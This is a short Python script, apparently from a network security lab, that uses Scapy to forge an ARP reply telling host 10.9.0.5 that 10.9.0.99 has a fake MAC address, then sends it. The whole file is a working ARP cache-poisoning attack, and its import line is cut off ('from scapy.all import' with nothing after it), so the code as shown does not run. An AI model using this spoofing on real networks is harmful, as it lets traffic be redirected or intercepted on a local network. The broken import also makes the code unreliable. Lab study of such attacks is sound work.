#!/usr/bin/env python3
from scapy.all import

IP_V       =  "10.9.0.5"
MAC_V_real =  "02:42:0a:09:00:05"

IP_T       = "10.9.0.99"
MAC_T_fake = "aa:bb:cc:dd:ee:ff"

ether      = Ether(src = MAC_T_fake, dst = MAC_V_real)
arp        = ARP(psrc = IP_T, hwsrc = MAC_T_fake,
                 pdst = IP_V, hwdst = MAC_V_real)
arp.op     = 2   # Reply

frame = ether/arp
sendp(frame)
